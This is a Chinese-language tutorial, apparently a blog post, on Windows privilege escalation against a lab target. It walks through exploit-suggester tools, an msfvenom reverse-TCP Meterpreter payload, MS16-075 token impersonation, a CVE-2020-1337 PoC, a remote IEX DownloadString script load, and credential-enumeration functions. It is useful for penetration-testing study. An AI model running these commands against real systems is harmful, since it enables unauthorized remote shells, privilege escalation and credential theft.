## 一、windows-exploit-suggester

    
    
     **windows-exploit-suggester.py --update  从微软官方自动下载安全公告数据库，生成最新的漏洞列表  
     下载地址：<https://github.com/AonCyberLabs/Windows-Exploit-Suggester>**

再在靶机中 **systeminfo > win10.txt**

    
    
     **windows-exploit-suggester.py --database   第一步得到的xls文件 --systeminfo  第二步得到的win10.txt文件 > result.txt**

得到靶机可能存在的漏洞列表:

![1647393616_62313b502bfe5f7516d34.png!small?1647393616233](https://image.3001.net/images/20220316/1647393616_62313b502bfe5f7516d34.png!small?1647393616233)

近几年CVE-2021-1732可以通杀很多windows server

## 二、msf

第一步我们了解到靶机可能存在ms16-075漏洞，结合msf进行提权

msfvenom生成windows下的可执行文件，使用windows/meterpreter/reverse_tcp建立反向链接反弹shell：

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.177.128.4(攻击机ip)  LPORT=4444 -f exe > /root/exp/mu.exe

将mu.exe复制到被攻击的windows主机中并运行

![1647356527_6230aa6f745fed6fd7106.png!small](https://image.3001.net/images/20220315/1647356527_6230aa6f745fed6fd7106.png!small)

攻击机中开启msfconsole,使用exploit/multi/handler建立session

需要注意的是payload的设置

![1647356656_6230aaf03758c76b7f9d3.png!small](https://image.3001.net/images/20220315/1647356656_6230aaf03758c76b7f9d3.png!small)

攻击成功（截图里面是4433端口是我后来重新生成了exe，懒的重新截了，果咩）

![1647356799_6230ab7f80187ead37df9.png!small](https://image.3001.net/images/20220315/1647356799_6230ab7f80187ead37df9.png!small)

![1647356973_6230ac2d6f05c367e28f2.png!small](https://image.3001.net/images/20220315/1647356973_6230ac2d6f05c367e28f2.png!small)

这里是普通用户权限，靶机下载exp或者上传exp:

<https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075>

攻击机shell中运行potato.exe:

    
    
    execute -cH -f potato.exe -i

加载incognito功能

    
    
    use incognito

列出用户组和用户可用的令牌

    
    
    list_tokens -g
    list_tokens -u

再执行exp

    
    
    execute -cH -f potato.exe

再list_tokens -u 可以看到system的token, getuid得到：

![1647395061_623140f53fa9efdf0c891.png!small?1647395061293](https://image.3001.net/images/20220316/1647395061_623140f53fa9efdf0c891.png!small?1647395061293)

**********************************************************************************************************

还可以用msf内置的模块进行ms16-075的利用：

首先还是要获得一个session,同上面写的：

![1647398751_62314f5f57afdcc67fd14.png!small?1647398751447](https://image.3001.net/images/20220316/1647398751_62314f5f57afdcc67fd14.png!small?1647398751447)

background返回msf

search
ms16-075![1647399265_6231516152cd7465cf993.png!small?1647399265445](https://image.3001.net/images/20220316/1647399265_6231516152cd7465cf993.png!small?1647399265445)

用第二个 use 1 , 然后set payload set lport set lhost set session 等一系列set

![1647399444_62315214eb83175695ec7.png!small?1647399444958](https://image.3001.net/images/20220316/1647399444_62315214eb83175695ec7.png!small?1647399444958)

![1647399474_6231523215e168b7e8ae7.png!small?1647399474184](https://image.3001.net/images/20220316/1647399474_6231523215e168b7e8ae7.png!small?1647399474184)

失败了...... QAQ

******************************************************************************************************************

> 一些小知识：
>
> 得到session后，msf中有一个模块可以更精准的探测靶机中可能存在的漏洞：
>  
>  
>     use multi/recon/local_exploit_suggester  
>     > set session 1  
>     > run

![1647399070_6231509eef841e55834cb.png!small?1647399071284](https://image.3001.net/images/20220316/1647399070_6231509eef841e55834cb.png!small?1647399071284)

如本次扫描可以看到靶机存在 **CVE-2020-1337** 漏洞

>  **关于这个漏洞的详细解释：**
>
>  **https://bbs.pediy.com/thread-261557.htm**

下载poc文件：<https://github.com/lyshark/Windows-exploits/blob/master/CVE-2020-1337.rar>

在powershell中执行：

![1647416804_623195e498054c96df7b8.png!small?1647416804456](https://image.3001.net/images/20220316/1647416804_623195e498054c96df7b8.png!small?1647416804456)

    
    
    注意：如果powershell中无法直接运行ps1文件则先以管理员身份打开powershell  
    Get-ExecutionPolicy -List  
    set-executionpolicy remotesigned

![1647417231_6231978f581c7b5f90986.png!small?1647417231216](https://image.3001.net/images/20220316/1647417231_6231978f581c7b5f90986.png!small?1647417231216)

运行 .\poc1.ps

提示reboot后，关机，看c:\windows\sytem32中是不是存在phoneinfo.dll，如果有，运行wertrigger.exe

whoami得到system权限

![1647417761_623199a1ef2ab48362eb6.png!small?1647417761833](https://image.3001.net/images/20220316/1647417761_623199a1ef2ab48362eb6.png!small?1647417761833)

> 放一些windows提权链接：
>
> windows提权辅助工具：winpeas (看文件权限好用) 、windows_exploit_suggester.py
>
> Windows内核漏洞提权exp合集：<https://github.com/SecWiki/windows-kernel-exploits>
>
> Windows 下的提权大合集：<https://github.com/lyshark/Windows-exploits>
>
> windows提权工具：<https://github.com/klsfct/getshell>
>
> 这几个可以互相补充着看，内容有点相似

## 三、Sherlock脚本

一个poweshell脚本，可以 **快速找到本地特权提升漏洞缺失的软件补丁** 。

下载地址：<https://github.com/rasta-mouse/Sherlock>

下载下来本地执行： **Import-Module Sherlock.ps1**

【或者远程加载脚本： **IEX (New-Object
System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')** 】

![1650249185_625ccde1d6d2be94ecaab.png!small?1650249186004](https://image.3001.net/images/20220418/1650249185_625ccde1d6d2be94ecaab.png!small?1650249186004)

发现漏洞： **Find-AllVuls** 可以看到本机可能存在的漏洞，得到的结果可以与windows-exploit-suggester进行对比筛选![1650249351_625cce870f39f0afb9195.png!small](https://image.3001.net/images/20220418/1650249351_625cce870f39f0afb9195.png!small)

##  **四、PrivescCheck**

PrivescCheck是一款 **针对Windows系统的提权枚举脚本** ，该脚本能给
**枚举出目标windows系统中常见的windows错误安全配置**
，而这些错误的安全配置将允许攻击者在目标系统中实现信息收集和权限提升。工具基于powerup工具实现，并且增加更多检测机制。

下载地址：<https://github.com/itm4n/PrivescCheck>

> 开发者总结的PrivescCheck脚本优势及注意事项：
>
> 1、不使用类似accesschk.exe之类的第三方工具；  
> 2、不使用类似whoami.exe或netstat.exe之类的Windows内置命令；  
> 3、不使用类似sc.exe或tasklist.exe之类的Windows内置工具；  
> 4、不使用WMI；  
> 5、必须兼容PowerShell v2；

本地使用ps脚本： **Import-Module
.\PrivescCheck.ps1**![1650249865_625cd089610baeafd0d33.png!small?1650249865511](https://image.3001.net/images/20220418/1650249865_625cd089610baeafd0d33.png!small?1650249865511)

 **Invoke-PrivescCheck** 查看本机可能存在的错误安全配置

![1650250384_625cd290aa67d8682adb9.png!small?1650250384816](https://image.3001.net/images/20220418/1650250384_625cd290aa67d8682adb9.png!small?1650250384816)

![1650250458_625cd2dad1657ba11acc7.png!small?1650250459004](https://image.3001.net/images/20220418/1650250458_625cd2dad1657ba11acc7.png!small?1650250459004)

> 可调用的函数：
>
>  **获取当前用户信息：**
>
> Invoke-UserCheck - 获取当前用户的用户名和SID
>
> Invoke-UserGroupsCheck - 枚举当前用户所属的组（默认组和低特权组除外）
>
> Invoke-UserPrivilegesCheck - 枚举潜在高权限用户的令牌
>
>  **获取目标设备服务：**
>
> Invoke-InstalledServicesCheck - 枚举非默认服务
>
> Invoke-ServicesPermissionsCheck - 枚举当前用户可以通过服务控制管理器修改的服务
>
> Invoke-ServicesPermissionsRegistryCheck - 枚举当前用户可在注册表中修改的服务
>
> Invoke-ServicesImagePermissionsCheck - E枚举具有可修改二进制文件（或参数）的所有服务
>
> Invoke-ServicesUnquotedPathCheck - 枚举具有可利用的未引用路径的服务  
>  **DLL劫持：**
>
> Invoke-DllHijackingCheck - 检查是否有任何系统路径文件夹可修改程序/进程获取
>
> Invoke-InstalledProgramsCheck - 枚举默认情况下未安装的应用程序
>
> Invoke-ModifiableProgramsCheck - 枚举拥有DLL文件的可修改EXE的应用程序
>
> Invoke-RunningProcessCheck - 枚举正在运行的进程
>
>  **获取凭据：**
>
> Invoke-SamBackupFilesCheck - 检查SAM/SYSTEM备份文件的常用位置
>
> Invoke-UnattendFilesCheck -枚举无人使用的文件并提取凭证
>
> Invoke-WinlogonCheck - 检查存储在Winlogon注册表项中的凭据
>
> Invoke-CredentialFilesCheck - 枚举存储在当前用户AppData文件夹中的凭据文件
>
> Invoke-VaultCredCheck - 枚举保存在凭据管理器中的凭据
>
> Invoke-VaultListCheck - 枚举保存在凭据管理器中的web凭据
>
> Invoke-GPPPasswordCheck - 枚举包含非空“cpassword”字段的组策略首选项（GPP）
>
>  **获取注册表信息：**
>
> Invoke-UacCheck - 检查是否启用了UAC（用户访问控制）
>
> Invoke-LapsCheck - 检查是否启用了LAPS（本地管理密码解决方案）
>
> Invoke-PowershellTranscriptionCheck - 检查是否配置/启用了PowerShell转录
>
> Invoke-RegistryAlwaysInstallElevatedCheck -> 检查注册表中是否设置了AlwaysInstallElevated项
>
> Invoke-LsaProtectionsCheck - 检查LSASS是否作为受保护进程运行（附加检查）
>
>  **获取网络信息：**
>
> Invoke-TcpEndpointsCheck - 枚举本地计算机（IPv4和IPv6）上的异常TCP节点
>
> Invoke-UdpEndpointsCheck - 枚举本地计算机（IPv4和IPv6）上的异常UDP节点
>
>  **杂项：**
>
> Invoke-WindowsUpdateCheck - 检查目标设备的上次更新时间
>
> Invoke-SystemInfoCheck - 获取目标设备操作系统的名称和完整的版本字符串
>
> Invoke-LocalAdminGroupCheck - 枚举默认本地管理组的成员
>
> Invoke-MachineRoleCheck - 获取目标设备的角色（工作站、服务器、域控制器）
>
> Invoke-SystemStartupHistoryCheck - 获取目标设备系统启动事件的列表
>
> Invoke-SystemStartupCheck - 获取目标系统的上次启动时间
>
> Invoke-SystemDrivesCheck - 获取当前映射的本地驱动器和网络共享的列表

## 五、WindowsVulnScan

这是一款基于主机的漏洞扫描工具， **查找主机上具有的CVE，查找具有公开EXP的CVE的Python脚本** 。

采用多线程确保可以快速的请求数据，采用线程锁可以在向sqlite数据库中写入数据避免`database is
locked`的错误，采用`md5`哈希算法确保数据不重复插入。本工具 **查找是否有公开exp的网站为**`
**shodan**`,该网站限制网络发包的速度，因而采用了单线程的方式，且耗时较长。

下载地址：<https://github.com/chroblert/WindowsVulnScan>

使用方法：

1.先运行 **KBCollect.ps** 收集信息，得到KB.json文件

![1650251650_625cd78227e3b2948ebbd.png!small?1650251650453](https://image.3001.net/images/20220418/1650251650_625cd78227e3b2948ebbd.png!small?1650251650453)

2. **pip install -requirements.txt**

3\. **python cve-check.py -u** 来创建CVEKB数据库

（换了个主机实验，之前那个主机python没装好我是懒狗阿巴阿巴阿巴阿巴阿巴）

![1650252698_625cdb9ac3d915faebbad.png!small?1650252698801](https://image.3001.net/images/20220418/1650252698_625cdb9ac3d915faebbad.png!small?1650252698801)

4.运行 **cve-check.py -C -f KB.json** 查看具有公开exp的cve, 同时可以 **使用-n -N指定系统和版本**

![1650252964_625cdca4b4c8a0d1d54f4.png!small?1650252964745](https://image.3001.net/images/20220418/1650252964_625cdca4b4c8a0d1d54f4.png!small?1650252964745)

## 六、提权辅助网页

在Windows提权的时候可以在线对比补丁找Exp

这个网站数据源每周更新一次 <http://bugs.hacking8.com/tiquan/>

